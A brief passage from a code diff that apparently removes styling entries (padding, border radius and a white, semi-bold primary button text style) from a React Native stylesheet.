-    paddingVertical: 12,
-    borderRadius: 12,
-  },
-  primaryButtonText: {
-    color: '#FFFFFF',
-    fontWeight: '600',
-    fontSize: 14,
   },
 });
 
